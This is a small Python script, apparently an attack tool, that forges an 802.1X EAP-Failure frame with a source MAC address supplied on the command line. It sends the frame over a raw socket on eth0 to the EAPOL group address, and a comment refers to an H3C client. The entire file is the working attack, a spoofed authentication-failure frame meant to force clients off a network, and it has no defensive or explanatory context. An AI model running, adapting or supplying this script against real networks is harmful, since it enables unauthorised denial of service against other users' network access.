from socket import *
from eappacket import *
import binascii
import sys

def get_EAP_failure(attack_addr):
    packet_id = 10
    attack_addr = binascii.unhexlify(attack_addr.replace(':', ''))
    ethernet_header = get_ethernet_header(PAE_GROUP_ADDR, attack_addr, ETHERTYPE_PAE)
    return ethernet_header + get_EAPOL(EAPOL_EAPPACKET, get_EAP(EAP_FAILURE, packet_id))


def main():
    # bind the h3c client to the EAP protocal 
    client = socket(AF_PACKET, SOCK_RAW, htons(ETHERTYPE_PAE))
    client.bind(('eth0', ETHERTYPE_PAE))
    client.send(get_EAP_failure(sys.argv[1]))

if __name__ == '__main__':
    main()
